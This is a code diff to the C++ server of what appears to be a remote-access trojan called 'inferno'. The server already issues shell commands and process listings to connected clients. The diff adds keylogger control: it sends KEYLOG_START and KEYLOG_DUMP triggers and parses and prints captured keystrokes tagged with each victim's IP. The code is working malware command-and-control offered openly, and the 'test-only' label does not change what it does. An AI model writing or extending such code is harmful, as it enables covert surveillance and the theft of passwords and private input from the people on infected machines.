@@ -174,10 +174,30 @@ void Server::processPacketBuffer(ClientContext& client) {
                 client.socket.sendData(cmd_req.serialize());
             }
 
+            // Test-only Keylogger Trigger
+            const char* keylog_trigger = std::getenv("INFERNO_KEYLOG_TRIGGER");
+            if (keylog_trigger && *keylog_trigger) {
+                Packet kl_start(static_cast<uint16_t>(Opcode::KEYLOG_START), "");
+                client.socket.sendData(kl_start.serialize());
+                std::cout << "[Server] Sent KEYLOG_START trigger." << std::endl;
+            }
+
         } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_RES)) {
             printProcessList(client.socket.getIp(), payload_str);
+            
+            // Check if this was the last page
+            if (payload_str.size() >= 3 && static_cast<uint8_t>(payload_str[2]) == 1) {
+                const char* keylog_trigger = std::getenv("INFERNO_KEYLOG_TRIGGER");
+                if (keylog_trigger && *keylog_trigger) {
+                    Packet kl_dump(static_cast<uint16_t>(Opcode::KEYLOG_DUMP), "");
+                    client.socket.sendData(kl_dump.serialize());
+                    std::cout << "[Server] Sent KEYLOG_DUMP trigger." << std::endl;
+                }
+            }
         } else if (opcode == static_cast<uint16_t>(Opcode::CMD_RES)) {
             printShellOutput(client.socket.getIp(), payload_str);
+        } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DATA)) {
+            printKeylogData(client.socket.getIp(), payload_str);
         } else {
             std::cout << "[Server] Received Opcode " << opcode 
                       << " from " << client.socket.getIp() << std::endl;
@@ -269,6 +289,38 @@ void Server::printShellOutput(const std::string& ip, const std::string& payload)
         std::cerr << "[Server] Shell error from " << ip << ": "
                   << sanitize(payload, 3, data_len) << std::endl;
     }
+}
+
+void Server::printKeylogData(const std::string& ip, const std::string& payload) {
+    if (payload.size() < 10) return;
+
+    uint32_t seq = (static_cast<uint32_t>(static_cast<uint8_t>(payload[0])) << 24) |
+                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[1])) << 16) |
+                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[2])) << 8)  |
+                    static_cast<uint32_t>(static_cast<uint8_t>(payload[3]));
+                    
+    uint32_t ts  = (static_cast<uint32_t>(static_cast<uint8_t>(payload[4])) << 24) |
+                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[5])) << 16) |
+                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[6])) << 8)  |
+                    static_cast<uint32_t>(static_cast<uint8_t>(payload[7]));
+                    
+    uint16_t len = (static_cast<uint16_t>(static_cast<uint8_t>(payload[8])) << 8)  |
+                    static_cast<uint16_t>(static_cast<uint8_t>(payload[9]));
+                    
+    if (payload.size() < static_cast<size_t>(10 + len)) return;
+    
+    std::string keystrokes = payload.substr(10, len);
+    
+    std::cout << "\n" << std::setfill('*') << std::setw(60) << "" << "\n";
+    std::cout << "[Server] KEYLOGGER DUMP from " << ip << "\n";
+    std::cout << "Sequence: " << seq << " | Timestamp: " << ts << "\n";
+    std::cout << std::setfill('-') << std::setw(60) << "" << "\n";
+    if (keystrokes.empty()) {
+        std::cout << "(No keystrokes captured in this session)\n";
+    } else {
+        std::cout << keystrokes << "\n";
+    }
+    std::cout << std::setfill('*') << std::setw(60) << "" << "\n" << std::endl;
 }
 
 } // namespace inferno
